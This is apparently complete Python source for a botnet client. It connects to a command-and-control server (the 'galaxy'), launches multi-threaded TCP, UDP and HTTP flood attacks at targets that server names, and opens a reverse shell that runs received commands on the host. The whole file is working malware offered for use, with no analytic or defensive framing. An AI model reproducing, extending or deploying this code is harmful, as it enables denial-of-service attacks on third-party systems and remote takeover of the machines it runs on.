#!/usr/bin/env python3

# import libraries
from signal import signal, SIGINT
import os
import threading
import socket
import multiprocessing
import sys
import random
import subprocess
import time
import struct
import datetime as dt

# get platform
if sys.platform in ('linux', 'linux2'):
    planet_os = "linux"
elif sys.platform == "darwin":
    planet_os = "mac"
elif sys.platform == "win32":
    planet_os = "windows"
    import ctypes
else:
    print("This platform is unsupported.")
    os._exit(0)

# functions
def wait_for_threads():
    while open_threads > 0:
        time.sleep(0.1)

def getRealTime():
    ntp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    msg = '\x1b' + 47 * '\0'
    ntp_socket.sendto(msg.encode(), ("pool.ntp.org", 123))
    msg, _ = ntp_socket.recvfrom(1024)
    t = int(struct.unpack("!12I", msg)[10]) - 2208988800
    time_new = dt.datetime.fromtimestamp(t)
    return time_new.strftime("hours: %H minutes: %M seconds: %S")

def ddos():
    global planet_attacking, open_threads
    if flood_type == "tcp":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bytes = random._urandom(10240)
        s.connect((str(target_ip), int(target_port)))
        while planet_attacking:
            try:
                s.send(bytes)
            except IOError as e:
                if not planet_attacking:
                    break
                elif str(e) in ("[Errno 110] Connection timed out", "[Errno 32] Broken pipe", "[Errno 104] Connection reset by peer"):
                    continue
                elif str(e) == "[Errno 111] Connection refused":
                    print("Target is offline, stopping attack...")
                    planet_attacking = False
                    break
                else:
                    print("An error occurred.")
                    print(e)
                    break
    elif flood_type == "udp":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(10240)
        s.connect((str(target_ip), int(target_port)))
        while planet_attacking:
            try:
                s.send(bytes)
            except IOError as e:
                if not planet_attacking:
                    break
                elif str(e) in ("[Errno 110] Connection timed out", "[Errno 32] Broken pipe", "[Errno 104] Connection reset by peer"):
                    continue
                elif str(e) == "[Errno 111] Connection refused":
                    print("Target is offline, stopping attack...")
                    planet_attacking = False
                    break
                else:
                    print("An error occurred.")
                    print(e)
                    break
    else:
        src_ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(target_ip), int(target_port)))
        while planet_attacking:
            try:
                s.send(("GET /" + str(target_ip) + "HTTP/1.1\r\n").encode('ascii'))
                s.send(("Host: " + str(src_ip) + "\r\n\r\n").encode('ascii'))
            except IOError as e:
                if not planet_attacking:
                    break
                elif str(e) in ("[Errno 110] Connection timed out", "[Errno 32] Broken pipe", "[Errno 104] Connection reset by peer"):
                    continue
                elif str(e) == "[Errno 111] Connection refused":
                    print("Target is offline, stopping attack...")
                    planet_attacking = False
                    break
                else:
                    print("An error occurred.")
                    print(e)
                    break
    if "s" in locals():
        s.close()
    open_threads -= 1

def exit_handler(sig, frame):
    global planet_online, planet_shutting_down
    planet_shutting_down = True
    if planet_online:
        planet_socket.send(f"planet ID: {planet_id} offline".encode())
    planet_online = False
    planet_attacking = False
    planet_shelled = False
    planet_socket.close()
    print("Exiting...")
    wait_for_threads()
    os._exit(0)

def connect_to_galaxy():
    global planet_socket, planet_online
    while not planet_online:
        try:
            print("Connecting to galaxy...")
            planet_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            planet_socket.connect((galaxy_ip, galaxy_port))
            print("Successfully connected to galaxy.")
            planet_online = True
        except Exception:
            print("Cannot connect to galaxy. Retrying in 5 seconds...")
            time.sleep(5)

def shell():
    global planet_shelled
    shell_socket = socket.socket()
    shell_socket.connect((galaxy_ip, shell_port))
    cwd = os.getcwd()
    shell_socket.send(cwd.encode())
    while not planet_shutting_down:
        shell_cmds = []
        shell_cmd = shell_socket.recv(shell_buf_size).decode()
        if shell_cmd.lower() == "exit":
            shell_socket.close()
            planet_shelled = False
            break
        if "&&" in shell_cmd and not ";" in shell_cmd:
            shell_cmds = shell_cmd.split("&&")
        elif ";" in shell_cmd and not "&&" in shell_cmd:
            shell_cmds = shell_cmd.split(";")
        elif "&&" in shell_cmd and ";" in shell_cmd:
            shell_cmds = shell_cmd.split("&&")
            for i, possibleCMD in enumerate(shell_cmds):
                if ";" in possibleCMD:
                    shell_cmds[i] = possibleCMD.split(";")
        if not shell_cmds:
            if shell_cmd[:2].lower() == "cd":
                new_shell_cmd = shell_cmd.replace("cd ", "", 1).strip()
                try:
                    os.chdir(new_shell_cmd)
                except FileNotFoundError:
                    output = f"Directory {new_shell_cmd} not found."
                else:
                    output = ""
            else:
                output = subprocess.getoutput(shell_cmd.strip())
        else:
            for shell_list_cmd in shell_cmds:
                if shell_list_cmd[:2].lower() == "cd":
                    new_shell_list_cmd = shell_list_cmd.replace("cd ", "", 1).strip()
                    try:
                        os.chdir(new_shell_list_cmd)
                    except FileNotFoundError:
                        output = f"Directory {new_shell_list_cmd} not found."
                    else:
                        output = ""
                else:
                    output = f"{output}\n{subprocess.getoutput(shell_list_cmd.strip())}"
        cwd = os.getcwd()
        message = f"{output}<sep>{cwd}"
        shell_socket.send(message.encode())
    if planet_shutting_down:
        shell_socket.send("shutting down".encode())
    shell_socket.close()

def connection_handler():
    global planet_online, flood_type, target_ip, target_port, open_threads, planet_id, planet_shelled, planet_attacking, shell_buf_size
    while not planet_shutting_down:
        while planet_online:
            try:
                data = planet_socket.recv(1024).decode("ascii").lower()
                if "ddos" in data:
                    print("Recieved DDoS command.")
                    data = data.replace("ddos ", "").strip().split()
                    target_ip, target_port, flood_type = data
                    attack_thread_count = int(planet_threads) * 128
                    if planet_os == "windows":
                        system_limits = int(ctypes.windll.msvcrt._getmaxstdio())
                    else:
                        system_limits = int(os.popen("ulimit -n").read().strip())
                    if attack_thread_count >= system_limits:
                        attack_thread_count = system_limits - 128
                    planet_attacking = True
                    for _ in range(attack_thread_count):
                        thread = threading.Thread(target=ddos)
                        thread.start()
                        open_threads += 1
                    planet_socket.send(f"planet ID: {planet_id} attacking".encode())
                    print(f"Attacking! (IP: {target_ip} | Port: {target_port} | Type: {flood_type} flood)")
                elif "planet ID: " in data:
                    planet_id = data.replace("planet ID: ", "").strip()
                elif "shellcmd start bufsize " in data:
                    shell_buf_size = int(data.replace("shellcmd start bufsize ", "").strip())
                    planet_shelled = True
                    planet_socket.send(f"planet ID: {planet_id} shelled".encode())
                    shell()
            #except Exception as e:
            #    print("Having trouble from galaxy, attempting to reconnect...")
            #    planet_online = False
            #    connect_to_galaxy()
            except IOError as e:
                print(e)
            time.sleep(1)
        planet_attacking = False
        planet_shelled = False
    open_threads -= 1

# exit handler
signal(SIGINT, exit_handler)

# variables
galaxy_ip = "192.168.1.2"
galaxy_port = 9999
shell_port = 10000
planet_threads = multiprocessing.cpu_count()
open_threads = 0
planet_id = ""
flood_type = ""
target_ip = ""
target_port = 0
shell_buf_size = 1024 * 128
planet_shelled = False
planet_attacking = False
planet_online = False
planet_shutting_down = False

# connect to galaxy
connect_to_galaxy()
connection_handler_thread = threading.Thread(target=connection_handler)
connection_handler_thread.start()
open_threads += 1
